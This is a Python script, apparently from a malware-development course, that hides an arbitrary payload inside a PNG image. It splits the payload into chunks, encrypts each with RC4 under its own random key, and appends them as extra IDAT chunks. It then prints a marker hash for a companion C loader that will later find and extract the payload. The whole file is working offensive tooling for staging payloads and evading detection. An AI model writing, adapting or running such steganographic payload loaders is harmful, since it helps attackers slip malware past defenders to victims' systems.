# @NUL0x4C | @mrd0x : MalDevAcademy
import sys
import subprocess
import os

def install(package):
    print(f"[i] Installing {package}...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"[!] Failed to install {package}: {e}")
        sys.exit(1)

# Try importing libraries and install if missing
try:
    from Crypto.Cipher import ARC4
except ImportError:
    print("[i] Detected an missing library")
    install("pycryptodome")

try:
    from colorama import Fore, Style, init
except ImportError:
    print("[i] Detected an missing library")
    install("colorama")

# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------

import shutil
import argparse
import secrets
import random
import zlib
import sys
import os

from Crypto.Cipher import ARC4
from colorama import Fore, Style, init

# Initialize colorama 
init(autoreset=True)

# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------

IDAT            = b'\x49\x44\x41\x54'                                       # 'IDAT'
IEND            = b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'       # PNG file footer
MAX_IDAT_LNG    = 8192                                                      # Maximum size of each IDAT chunk
RC4_KEY_LNG     = 16                                                        # RC4 key size

# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------

def print_red(data):
    print(f"{Fore.RED}{data}{Style.RESET_ALL}")
def print_yellow(data):
    print(f"{Fore.YELLOW}{data}{Style.RESET_ALL}")
def print_cyan(data):
    print(f"{Fore.CYAN}{data}{Style.RESET_ALL}")
def print_white(data):
    print(f"{Fore.WHITE}{data}{Style.RESET_ALL}")
def print_blue(data):
    print(f"{Fore.BLUE}{data}{Style.RESET_ALL}")

# ------------------------------------------------------------------------------------------------------------------------

def generate_random_bytes(key_length=RC4_KEY_LNG):
    return secrets.token_bytes(key_length)

# ------------------------------------------------------------------------------------------------------------------------

def calculate_chunk_crc(chunk_data):
    return zlib.crc32(chunk_data) & 0xffffffff  

# ------------------------------------------------------------------------------------------------------------------------

def create_idat_section(buffer):
    
    if len(buffer) > MAX_IDAT_LNG:
        print_red("[!] Input Data Is Bigger Than IDAT Section Limit")
        sys.exit(0)
    
    idat_chunk_length    = len(buffer).to_bytes(4, byteorder='big')                            # Create IDAT chunk length
    idat_crc             = calculate_chunk_crc(IDAT + buffer).to_bytes(4, byteorder='big')     # Compute CRC
    idat_section         = idat_chunk_length + IDAT + buffer + idat_crc                        # The complete IDAT section

    print_white(f"[>] Created IDAT Of Length [{int.from_bytes(idat_chunk_length, byteorder='big')}] And Hash [{hex(int.from_bytes(idat_crc, byteorder='big'))}]")
    return idat_section, idat_crc

# ------------------------------------------------------------------------------------------------------------------------

def remove_bytes_from_end(file_path, bytes_to_remove):
    with open(file_path, 'rb+') as f:
        f.seek(0, 2)
        file_size = f.tell()
        f.truncate(file_size - bytes_to_remove)    

# ------------------------------------------------------------------------------------------------------------------------

def encrypt_rc4(key, data):
    # Initialize the RC4 cipher with the key
    cipher = ARC4.new(key)
    # Encrypt the data
    return cipher.encrypt(data)

# ------------------------------------------------------------------------------------------------------------------------

def plant_payload_in_png(ipng_fname, opng_fname, png_buffer):

    # create new png
    shutil.copyfile(ipng_fname, opng_fname)
    
    # remove the IEND footer
    remove_bytes_from_end(opng_fname, len(IEND))

    # mark the start of our payload using a special IDAT section
    mark_idat, special_idat_crc = create_idat_section(generate_random_bytes(random.randint(16, 256)))
    with open(opng_fname, 'ab') as f:
        f.write(mark_idat)

    # add our payload as IDAT sections
    with open(opng_fname, 'ab') as f:
        for i in range(0, len(png_buffer), (MAX_IDAT_LNG - RC4_KEY_LNG)):
            rc4_key                 = generate_random_bytes()
            idat_chunk_data         = rc4_key + encrypt_rc4(rc4_key, png_buffer[i:i + (MAX_IDAT_LNG - RC4_KEY_LNG)])  
            idat_section, idat_crc  = create_idat_section(idat_chunk_data)
            print_cyan(f"[i] Encrypted IDAT With RC4 Key: {rc4_key.hex()}")

            # Write the section to the file 
            f.write(idat_section)
    
    # add the IEND footer
    with open(opng_fname, 'ab') as f:
        f.write(IEND)

    # return the hash of our special IDAT section, this will be used to identify it in the C code
    return special_idat_crc    

# ------------------------------------------------------------------------------------------------------------------------

def is_png(file_path):

    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"[!] '{file_path}' does not exist")

    try:
        with open(file_path, 'rb') as f:
            return f.read(8) == b'\x89PNG\r\n\x1a\n'
    except Exception as e:
        print_red(f"[!] Error: {e}")
        return False

# ------------------------------------------------------------------------------------------------------------------------

def read_payload(file_path):

    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"[!] '{file_path}' does not exist")
    
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except Exception as e:
        print_red(f"[!] Error: {e}")
        return None
    
# ------------------------------------------------------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Embed An Encrypted Payload Inside A PNG")
    parser.add_argument('-i', '--input', type=str, required=True, help="Input payload file")
    parser.add_argument('-png', '--pngfile', type=str, required=True, help="Input PNG file to embed the payload into")
    parser.add_argument('-o', '--output', type=str, required=True, help="Output PNG file name")
    args = parser.parse_args()

    if not args.output.endswith('.png'):
        args.output += '.png'

    if not is_png(args.pngfile):
        print_red(f"[!] '{args.pngfile}' is not a valid PNG file.")
        sys.exit(0)

    payload_data = read_payload(args.input)
    if payload_data is None:
        sys.exit(0)

    special_idat_crc = plant_payload_in_png(args.pngfile, args.output, payload_data)
    
    print_yellow(f"[*] '{args.output}' is created!")
    print_white("[i] Copy The Following To Your Code: \n")
    print_blue("#define MARKED_IDAT_HASH\t 0x{:X}\n".format(int.from_bytes(special_idat_crc, byteorder='big')))

if __name__ == "__main__":
    main()

